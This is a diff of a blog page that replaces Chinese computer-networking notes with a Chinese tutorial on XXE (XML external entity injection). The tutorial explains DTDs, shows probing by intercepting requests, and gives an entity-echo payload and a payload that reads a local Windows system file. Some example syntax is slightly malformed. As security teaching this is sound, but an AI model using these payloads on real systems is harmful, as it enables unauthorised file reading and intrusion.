@@ -10,8 +10,8 @@
 
     <!--Description-->
     
-        <meta name="description" content="@TOC
-计算机网络与因特网一、具体构成的描述：对于什么是因特网这个问题有两种回答方式：其一，我们能够描述因特网的具体构成，即因特网的基本硬件和软件组件；其二，我们能够根据分布式应用提供的联网基础设施来描述因特网。1、端系统 （1）定义：端系统（主机）：处于因特网的边缘部分就是在因特网上的所有主机，">
+        <meta name="description" content="什么是XXEXXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。
+什么是XML，DTD一、">
     
 
     <!--Author-->
@@ -152,13 +152,13 @@
 
     <div class="post-header">
         <h1 class="title">
-            <a href="/2021/05/18/%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80/">
+            <a href="/2021/06/04/%E6%B5%85%E8%B0%88XXE/">
                 Untitled
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2021-05-18</span>
+                <span class="date">2021-06-04</span>
             
             
             
@@ -171,15 +171,16 @@
         
 
         <!-- Post Content -->
-        <p>@<a href="%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B">TOC</a></p>
-<h2 id="计算机网络与因特网"><a href="#计算机网络与因特网" class="headerlink" title="计算机网络与因特网"></a>计算机网络与因特网</h2><p>一、具体构成的描述：对于什么是因特网这个问题有两种回答方式：其一，我们能够描述因特网的具体构成，即因特网的基本硬件和软件组件；其二，我们能够根据分布式应用提供的联网基础设施来描述因特网。<br>1、端系统<br> （1）定义：端系统（主机）：处于因特网的边缘部分就是在因特网上的所有主机，即与因特网相连的设备，此处的“端”是“末端”之意。端系统可以是手表、平板电脑、电视等。<br>（2）具体功能：<br>&lt;1&gt;端系统通过通信链路和分组交换机连接在一起。（对于通信链路和分组交换机的详细介绍会在下一章）。通信链路有不同类型的物理媒体组成，这些物理媒体包括同轴电缆、铜线、光纤和无线电频谱。不同的链路能够以不同的速率传输数据，链路的传输速率以比特/秒度量。当一台端系统向另一台端系统发送数据时，发送端系统将数据分段，并为每段加上首部字节。由此形成的信息包用计算机网络的术语来说称为分组。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[发送端系统] -- 数据分段 -- 加上首部字节--&gt;B[目的端系统] </span><br></pre></td></tr></table></figure>
-<p>&lt;2&gt;端系统通过因特网服务提供商（ISP）接入因特网，每个ISP自身就是一个由多台分组交换机和多段通信链路组成的网络。各ISP为端系统提供了各种不同类型的网络接入。<br>&lt;3&gt;协议：端系统、分组交换机和其他因特网部件都要运行一系列协议。协议相关知识可见<a target="_blank" rel="noopener" href="https://editor.csdn.net/md/?articleId=112858711">计算机网络开放的端口和协议</a><br>（3）服务描述<br>我们现在从为应用程序提供服务的基础设施的角度来描述因特网。因特网除了传统的web冲浪应用外，还有在线社交网络、视频会议等。因为这些应用程序涉及多个相互交换数据的端系统，所以它们被称为分布式应用程序。<br>2、接入网<br>(1)家庭接入:DSL、电缆、FTTH、拔号和卫星<br>当前，宽带住宅接入有两种最流行的类型:数字用户线和电缆。<br>&lt;1&gt;电话线接入：住户通常从提供本地电话接入的本地电话公司处获得DSL因特网接入。因此，当使用DSL时，用户的本地电话公司也是它的ISP。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">B[家庭电话]  --&gt; A[分配器]</span><br><span class="line">C[DSL调制解调器] --&gt;A</span><br><span class="line"> D[家庭PC] --&gt;C</span><br><span class="line"> A --&gt;   E[中心局]</span><br><span class="line"> E --&gt;F[因特网]</span><br><span class="line"> E --&gt;G[电话网]</span><br></pre></td></tr></table></figure>
-<p>如图所示，每个用户的DSL调制解调器使用现有的电话线与位于电话公司的本地中心局（CO）中的数字用户线接入复用器（DSLAM）交换数据。家庭的DSL调制解调器得到数字数据后将其转换为高频音，以通过电话线传输给本地中心局；来自许多家庭的模拟信号在DSLAM处被转换回数字形式.<br>这种电话线接入因为上行速率和下行速率不一致，所以这种接入不对称。<br>&lt;2&gt;电缆因特网接入：电缆因特网接入利用了有线公司现有的有线电视基础设施。住宅从提供有线电视的公司获得了电缆因特网接入。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[数以万计的家庭] -- 同轴电缆 --&gt; B((光纤节点))</span><br><span class="line">A[数以万计的家庭]--&gt; C((光纤节点)) </span><br><span class="line">B --&gt;D[CMTS]</span><br><span class="line">C --&gt;D[CMTS]</span><br><span class="line">D --&gt;F[因特网]</span><br></pre></td></tr></table></figure>
-<p>电缆因特网接入需要特殊的调制解调器，这种调制解调器被称为电缆调制解调器。如同DSL调制解调器，电缆解调器通常是一个外部设备，通过一个以太网连接到家庭PC（以太网后面会介绍到）在电缆头端，电缆调制解调器端接系统与DSL网络的DSLAM具有类似的功能，即将来许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式。<br>&lt;3&gt;电缆因特网接入特征：<br>1.接入通常是不对称的，下行信道分配的传输速率通常比上行信道高。<br>2.共享广播媒体。如果几个用户同时经下行信道下载0一个视频文件，每个用户接收文件的实际速率大大低于电缆总计的下行速率</p>
-<h2 id="排队时延和分组丢失"><a href="#排队时延和分组丢失" class="headerlink" title="排队时延和分组丢失"></a>排队时延和分组丢失</h2><p>每台分组交换机有多条链路与之相连。对于每条相连的链路,该分组交换机具有一个输出缓存(output buffer,也称为输出队列(output queue)),它用于存储路由器准备发往那条链路的分组。该输出缓存在分组交换中起着重要的作用。除了存储转发时延以外,分组还要承受输出缓存的排队时延(queuing delay)。这些时延是变化的,变化的程度取决于网络的拥塞程度。因为缓存空间的大小是有限的,一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。在此情况下,将出现分组丢失(丢包)(packet loss),到达的分组或已经排队的分组之一将被丢弃。</p>
+        <h2 id="什么是XXE"><a href="#什么是XXE" class="headerlink" title="什么是XXE"></a>什么是XXE</h2><p>XXE漏洞全称XML External Entity Injection即<strong>xml外部实体注入漏洞</strong>，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+<h2 id="什么是XML，DTD"><a href="#什么是XML，DTD" class="headerlink" title="什么是XML，DTD"></a>什么是XML，DTD</h2><p>一、XML概念：<br>XML<br>可扩展标记语言。<br>通常所说的XML，就是指XML数据解析，是将数据文档解析成不同的格式。因为不同平台（软件）在做数据传递或数据文档共享的时候，同一数据文档可能在不同平台的 显示格式要求不同，这就出现了相对中立的语言（XML），来表示数据，给二者做转化。<br>XML类似于HTML，不同的是HTML不可自定义标签，XML可以。<br>二、1、DTD概念：文档类型定义。DTD文件一般和XML文件配合使用，主要是为了约束XML文件。 （）DTD就是上文中提到的实体<br>2、DTD基本语法：<br><code>&lt;!ELEMENT NAME CONTENT&gt;</code><br>其中</p>
+<ul>
+<li>ELEMENT是关键字，不可修改</li>
+<li>NAME表示元素名称</li>
+<li>CONTENT是元素类型，必须大写<br>(1)EMPTY————表示该元素不能包含子元素和文本，但可以有属性。<br>(2)ANY———表示该元素可以包含任何在该DTD中定义的元素内容<br>(3 )#PCDATA——可以包含任何字符数据，但是不能在其中包含任何子元素<br>3、外部实体：<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &lt;<span class="string">&quot;note.dtd&quot;</span>&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="如何判断XXE漏洞的存在"><a href="#如何判断XXE漏洞的存在" class="headerlink" title="如何判断XXE漏洞的存在"></a>如何判断XXE漏洞的存在</h2><img src="https://img-blog.csdnimg.cn/20210603091958241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对其进行抓包<br><img src="https://img-blog.csdnimg.cn/20210603092107186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改xml，添加任意标签观察是否存在回显<br><img src="https://img-blog.csdnimg.cn/20210603092147162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2>一、实体打印<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY hacker <span class="string">&quot;test&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+二、文件读取<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY f sYSTEM<span class="string">&quot;file:///C://Windows//win.ini&quot;</span> &gt;<span class="comment">//前提是电脑中得有//</span></span><br><span class="line">]&gt;<span class="xml"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2>任意文件读取<br>探测内网地址<br>通过DTD窃取文件<br>远程代码执行</li>
+</ul>
 
     </div>
 
